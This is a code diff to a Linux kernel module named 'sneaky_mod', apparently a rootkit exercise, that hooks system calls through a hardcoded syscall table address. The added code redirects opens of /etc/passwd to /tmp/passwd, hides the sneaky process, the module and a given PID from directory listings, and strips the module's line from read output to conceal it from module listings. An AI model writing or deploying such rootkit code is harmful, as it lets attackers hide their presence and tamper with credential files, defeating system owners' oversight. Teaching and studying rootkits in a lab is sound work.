@@ -9,8 +9,8 @@
 #include <linux/module.h> // for all modules
 #include <linux/sched.h>
 
-static int pid;
-module_param(pid, int, 0);
+static char *pid;
+module_param(pid, charp, 0);
 MODULE_PARM_DESC(pid, "The process id of sneaky program");
 
 #define BUFFER_LENGTH 1024
@@ -49,25 +49,59 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 asmlinkage int (*original_open)(const char *pathname, int flags);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                     unsigned int count);
-asmlinkage int (*original_read)(int fd, void *buf, size_t count);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  printk(KERN_INFO "Very, very Sneaky!\n");
+  printk(KERN_INFO "[Sneaky_sys_open]\n");
+  if (strcmp(pathname, "/etc/passwd") == 0) {
+    copy_to_user((void *)pathname, "/tmp/passwd",
+                 12); // 12 indicates the length of "/tmp/passwd\0"
+  }
   return original_open(pathname, flags);
 }
 
 // Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_open(pathname, flags);
+
+  int nread, bpos;
+  printk(KERN_INFO "[Sneaky_sys_getdents]!\n");
+  nread = original_getdents(fd, dirp, count);
+  for (bpos = 0; bpos < nread;) {
+    struct linux_dirent *d = (void *)dirp + bpos;
+
+    // skip sneaky_process, sneaky_mod, pid
+    if (strcmp(d->d_name, "sneaky_process") == 0 ||
+        strcmp(d->d_name, pid) == 0 || strcmp(d->d_name, "sneaky_mod") == 0) {
+      int dirent_size = d->d_reclen;
+      int nrest = ((void *)dirp + nread) - ((void *)d + dirent_size);
+      void *next = (void *)d + d->d_reclen;
+      memcpy(d, next, nrest);
+      nread -= dirent_size;
+    }
+
+    bpos += d->d_reclen;
+  }
+  return nread;
 }
 
 // Define our new sneaky version of the 'read' syscall
-asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_open(pathname, flags);
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+  ssize_t nread;
+
+  printk(KERN_INFO "[Sneaky_sys_read]!\n");
+  nread = original_read(fd, buf, count);
+  if (nread > 0) {
+    void *st = strstr(buf, "sneaky_mod");
+    if (st != NULL) {
+      void *ed = strchr(st, '\n');
+      int len = ed - st + 1;
+      memcpy(st, ed, nread - (st - buf) - len);
+      nread -= len;
+    }
+  }
+  return nread;
 }
 
 // The code that gets executed when the module is loaded
@@ -135,3 +169,4 @@ static void exit_sneaky_module(void) {
 
 module_init(initialize_sneaky_module); // what's called upon loading
 module_exit(exit_sneaky_module);       // what's called upon unloading
+MODULE_LICENSE("GPL");
